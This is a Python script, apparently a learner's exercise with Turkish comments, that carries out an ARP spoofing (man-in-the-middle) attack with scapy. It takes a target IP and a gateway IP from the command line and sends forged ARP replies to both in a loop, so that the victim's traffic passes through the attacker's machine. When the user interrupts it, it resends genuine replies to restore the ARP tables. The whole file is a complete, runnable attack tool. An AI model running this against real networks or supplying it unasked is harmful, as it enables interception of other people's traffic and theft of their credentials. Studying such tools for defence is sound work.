import scapy.all as scapy
import time
import optparse #kulluanicidan alinan girdinin parse edilmesi

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0] #verbose false  açıklama çıktısını engeller.

    return answered_list[0][1].hwsrc  #çıktıdaki src mac adresını almak ıcın , hardware src adress


def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)  # hwsrc belirtilmeyince saldırgan makinanın mac adresı otomatık atanır.
    #saldırgan kendi mac adresini (hwsrc) ve farklı bır makınenın ıp adresını kullanır. fonksıyon parametresinde belirtmeyınce kensı macı varsayılan olarak kullanılır
    #response paketı oldugu ıcın op=2
    scapy.send(arp_response,verbose=False) #verbose acıklamayı görüüntülemez
    #scapy.ls(scapy.ARP())


def reset_operation(fooled_ip,gateway_ip): # resetleme işleminde source mac adres saldırgan makıneye aıt degıldır.
    #Böylece dogru ıp-mac eslesmesi bildirilir.

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)


def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]  #[0] işlemi options ve arguments arasından optıons u dondurur.

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:

        arp_poisoning(user_target_ip,user_gateway_ip)
        #kurban makıneye gateway oldugunu bildirir.
        #target, poisoned_ip

        arp_poisoning(user_gateway_ip,user_target_ip)
        #gateway'e , diger(kurban) makıne oldugu bildirir
        #target,poisoned ip

        number += 2

        print("\rSending packets " + str(number),end="") # aynı satırdakı cıktının sadece number kısmı guncellenir. pyton 3 ile gelen ozellık
        #kod python 3 ile çalıştırılmalı.

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)